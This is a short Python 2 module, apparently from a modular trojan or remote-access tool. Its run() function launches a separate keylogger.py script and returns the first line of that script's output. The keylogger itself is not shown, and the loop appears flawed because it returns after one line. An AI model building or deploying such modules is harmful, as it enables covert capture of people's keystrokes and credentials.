import subprocess, time, os, sys

def run(**args):

	print "[*] In main_out module."

	cmd = [sys.executable, 'keylogger.py']

	p = subprocess.Popen(cmd,
  	stdout=subprocess.PIPE,
  	stderr=subprocess.STDOUT)

#for line in p.stdout:
#    print line,
	for line in iter(p.stdout.readline, b''):
  		return str(line)
